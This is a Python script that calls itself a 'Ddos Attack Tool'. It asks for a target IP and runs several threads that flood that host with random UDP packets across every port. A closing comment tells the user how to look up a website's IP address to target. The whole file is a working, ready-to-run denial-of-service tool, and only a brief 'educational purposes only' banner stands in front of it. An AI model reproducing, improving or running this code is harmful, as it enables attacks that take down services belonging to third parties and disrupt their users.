import socket
import random
import threading
import time
import os
import sys
import shutil

os.system("clear")

# Type With Animation
print("\n\n\n\n\n")
ab = "                 \033[36m System Loading..........."

for c in ab:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.1)
print("\n\n\n\n\n")

time.sleep(2)
os.system("clear")

ab = "                   \033[1;32m Loading Completed"

for c in ab:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.1)

print("\n")

# Name Input
while True:
    Name = input("     \n\n\n            \033[1;36m Enter Your Name: ").strip()
    if Name:
        break
    else:
        print("\033[91m      Name can't be empty. Please enter your name.\033[0m")

ab = "\033[1;32m             Hey " + Name + ", Be Ethical....\033[0m"

for c in ab:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.1)
print("\n\n\n")
time.sleep(2)
os.system("clear")

# Terminal width
columns = shutil.get_terminal_size().columns

# RKD logo
logo_lines = [
           ":::::::::  :::    ::: ::::::::: ",
        ":+:    :+: :+:   :+:  :+:    :+:",
        "+:+    +:+ +:+  +:+   +:+    +:+",
        "+#++:++#:  +#++:++    +#+    +:+",
        "+#+    +#+ +#+  +#+   +#+    +#+",
        "#+#    #+# #+#   #+#  #+#    #+#",
        "###    ### ###    ### #########"
]

print("\033[1;91m")
for line in logo_lines:
    print(line.center(columns))
print("\033[0m")

print("\033[32m" + "=" * columns + "\033[1;96m")
print(" Owner     : Mr.Rakibul Islam")
print(" Github    : https://github.com/RKD-TEAM")
print(" Facebook  : Alex Rk Khan")
print(" Tool Name : Ddos Attack Tool")
print("\033[32m" + "=" * columns + "\033[1;96m")
print("\033[31m!!!   This tool is for educational purposes only   !!!!!!   So don't use it for any illegal activities   !!!")
print("\033[32m" + "=" * columns + "\033[0m")

# ANSI কালার কোড
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"


def flood(target_ip, port_mode):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    port = 1  # Sequential পোর্ট শুরু
    sent = 0
    while True:
        packet_size = random.randint(100, 1500)
        byte_data = random._urandom(packet_size)
        if port_mode == "1":
            current_port = port
            port += 1
            if port > 65535:
                port = 1
        else:
            current_port = random.randint(1, 65535)
        try:
            sock.sendto(byte_data, (target_ip, current_port))
            sent += 1
            print(f"{GREEN}[Thread-{threading.current_thread().name}]{RESET} "
                  f"Sent {YELLOW}{sent}{RESET} packet to "
                  f"{CYAN}{target_ip}{RESET} through port {YELLOW}{current_port}{RESET} "
                  f"(size: {YELLOW}{packet_size}{RESET} bytes)")
        except Exception as e:
            print(f"{RED}Error sending packet: {e}{RESET}")
        time.sleep(0.005)


if __name__ == "__main__":
    target_ip = input(f"{CYAN}Enter your target IP: {RESET}")
    thread_count = int(input(f"{CYAN}Enter number of threads (2 - 5): {RESET}"))

    while True:
        port_mode = input(f"{CYAN}Choose port mode [1] Sequential  [2] Random: {RESET}").strip()
        if port_mode in ["1", "2"]:
            break
        else:
            print(f"{RED}Invalid choice. Please enter 1 or 2.{RESET}")

    threads = []
    for i in range(thread_count):
        t = threading.Thread(target=flood, args=(target_ip, port_mode))
        t.daemon = True
        t.start()
        threads.append(t)

    print(f"{GREEN}Started {thread_count} threads flooding {target_ip} on all ports.{RESET}")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{RED}Stopped by user.{RESET}")
        print(GREEN + "\nThank you for using the tool!" + RESET)
    input("\033[1;35mPress Enter to exit...")
    
#For Find Ip Address:-                        1. ByGoogle =https://www.nslookup.io/domains/google.com/dns-records/                                                   2. By Termux = Command ping Websitename.com